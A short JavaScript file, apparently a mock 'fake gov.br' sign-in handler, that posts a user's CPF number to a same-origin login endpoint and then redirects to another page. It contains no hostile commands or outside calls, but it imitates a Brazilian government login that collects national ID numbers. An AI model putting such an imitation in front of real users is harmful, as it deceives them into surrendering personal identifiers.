const btn = document.getElementById("continuar");

btn.addEventListener("click", async () => {

    const cpf = document.getElementById("cpf").value.trim();

    if (cpf === "") {
        alert("Digite seu CPF.");
        return;
    }

    btn.disabled = true;

    try {
        const response = await fetch("/fake-govbr/login", {
            method: "POST",
            credentials: "same-origin",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ cpf })
        });

        if (!response.ok) {
            throw new Error("Falha no login fake.");
        }

        alert("Login realizado com sucesso!");

        // Redireciona para visual.html
        window.location.href = "/visual.html";

    } catch (error) {
        alert(error.message || "Falha no login fake.");
        btn.disabled = false;
    }
});